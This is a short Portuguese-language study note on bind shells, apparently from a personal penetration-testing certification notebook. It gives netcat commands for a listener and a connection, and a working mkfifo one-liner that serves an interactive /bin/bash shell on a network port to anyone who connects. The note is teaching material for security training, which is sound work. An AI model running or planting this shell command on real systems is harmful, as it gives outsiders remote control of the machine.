> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/shells-and-payloads/bind-shells.md).

# Bind Shells

Com um bind shell, o `target`sistema inicia um listener e aguarda uma conexão do sistema de um pentester (caixa de ataque).

* Inicia um `netcat`ouvinte em uma porta especificada

```sh
sudo nc -lvnp <port #>
```

* Conecta-se a um ouvinte netcat no endereço IP e porta especificados

```sh
nc -nv <ip address of computer with listener started><port being listened on>
```

* Usa netcat para vincular um shell ( `/bin/bash`) ao endereço IP e porta especificados. Isso permite que uma sessão de shell seja servida remotamente a qualquer pessoa que se conecte ao computador em que este comando foi emitido

```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
